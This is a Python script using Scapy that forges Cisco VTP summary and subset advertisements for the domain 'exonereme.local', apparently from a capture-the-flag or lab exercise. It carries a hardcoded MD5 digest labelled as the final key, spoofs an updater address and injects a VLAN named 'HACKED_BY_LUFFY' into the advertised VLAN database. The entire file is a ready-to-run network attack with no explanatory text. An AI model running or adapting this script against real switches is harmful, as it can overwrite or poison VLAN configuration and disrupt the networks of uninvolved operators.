#!/usr/bin/env python3
import struct, time, socket
from scapy.all import *

IFACE = "eth0"
DOMAIN = "exonereme.local"
REVISION = 2
UPDATER = "10.24.20.18"

# LA LLAVE FINAL
TARGET_MD5 = b'\xF9\xFD\x71\x61\x80\xBF\xE5\x60\x17\x9D\x73\x65\xC7\xD2\xC1\x2D'

def build_vlan_tlv(vlan_id, vlan_name, vtype=0x01):
    name_bytes = vlan_name.encode('ascii')
    name_len = len(name_bytes)
    pad = (4 - (name_len % 4)) % 4
    name_padded = name_bytes + (b'\x00' * pad)
    info_length = 12 + len(name_padded)
    tlv = struct.pack('>BBBB', info_length, 0x00, vtype, name_len)
    tlv += struct.pack('>H', vlan_id)
    tlv += struct.pack('>H', 1500)
    tlv += struct.pack('>I', vlan_id)
    tlv += name_padded
    return tlv

def main():
    print(f"[*] Golpe final a {DOMAIN}...")
    mac = get_if_hwaddr(IFACE)

    # Summary (80 bytes)
    summary = struct.pack('>BBBB', 0x02, 0x01, 0x01, len(DOMAIN))
    summary += DOMAIN.encode('ascii').ljust(32, b'\x00')
    summary += struct.pack('>I', REVISION)
    summary += socket.inet_aton(UPDATER)
    summary += b"022717192026"
    summary += TARGET_MD5
    summary += struct.pack('>I', 0)
    summary += struct.pack('>I', 0)

    # Subset
    subset_header = struct.pack('>BBBB', 0x02, 0x02, 0x01, len(DOMAIN))
    subset_header += DOMAIN.encode('ascii').ljust(32, b'\x00')
    subset_header += struct.pack('>I', REVISION)

    vlan_data = build_vlan_tlv(1, "default")
    vlan_data += build_vlan_tlv(999, "HACKED_BY_LUFFY")
    vlan_data += build_vlan_tlv(1002, "fddi-default", vtype=0x02)
    vlan_data += build_vlan_tlv(1003, "trcrf-default", vtype=0x03)
    vlan_data += build_vlan_tlv(1004, "fddinet-default", vtype=0x04)
    vlan_data += build_vlan_tlv(1005, "trbrf-default", vtype=0x05)

    pkt = Ether(dst="01:00:0c:cc:cc:cc", src=mac) / \
          LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / \
          SNAP(OUI=0x00000c, code=0x2003)

    sendp(pkt / Raw(load=summary), iface=IFACE, verbose=0)
    time.sleep(0.1)
    sendp(pkt / Raw(load=subset_header + vlan_data), iface=IFACE, verbose=0)
    print("[!!!] PROCESO COMPLETADO.")

if __name__ == "__main__":
    main()
